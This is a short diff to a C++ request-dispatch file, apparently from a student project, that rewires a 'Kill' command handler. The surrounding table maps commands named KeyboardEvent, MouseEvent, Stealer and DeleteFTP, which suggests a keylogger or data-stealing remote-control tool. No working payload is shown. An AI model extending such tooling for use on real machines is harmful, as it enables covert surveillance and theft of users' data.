@@ -5,7 +5,7 @@
 // Login   <galibe_s@epitech.net>
 //
 // Started on  Sat Nov  5 15:54:01 2016 stephane galibert
-// Last update Tue Nov  8 18:03:10 2016 stephane galibert
+// Last update Thu Nov 10 11:52:33 2016 stephane galibert
 //
 
 #include "RequestBuilder.hpp"
@@ -15,9 +15,10 @@ RequestBuilder::RequestBuilder(void)
   _cmds[(int)PacketType::PT_NewClient] = std::bind(&RequestBuilder::nc, this);
   _cmds[(int)PacketType::PT_KeyboardEvent] = std::bind(&RequestBuilder::key, this);
   _cmds[(int)PacketType::PT_MouseEvent] = std::bind(&RequestBuilder::key, this);
-  _cmds[(int)PacketType::PT_Kill] = std::bind(&RequestBuilder::exit, this);
+  //_cmds[(int)PacketType::PT_Kill] = std::bind(&RequestBuilder::exit, this);
   _cmds[(int)PacketType::PT_Stealer] = std::bind(&RequestBuilder::stealer, this);
   _cmds[(int)PacketType::PT_DeleteFTP] = std::bind(&RequestBuilder::deleteftp, this);
+  _cmds[(int)PacketType::PT_Kill] = std::bind(&RequestBuilder::kill, this);
 }
 
 RequestBuilder::~RequestBuilder(void)
@@ -55,4 +56,9 @@ std::unique_ptr<IRequest> RequestBuilder::stealer(void) const
 std::unique_ptr<IRequest> RequestBuilder::deleteftp(void) const
 {
   return (std::unique_ptr<IRequest>(new DeleteFTP));
+}
+
+std::unique_ptr<IRequest> RequestBuilder::kill(void) const
+{
+  return (std::unique_ptr<IRequest>(new Kill));
 }
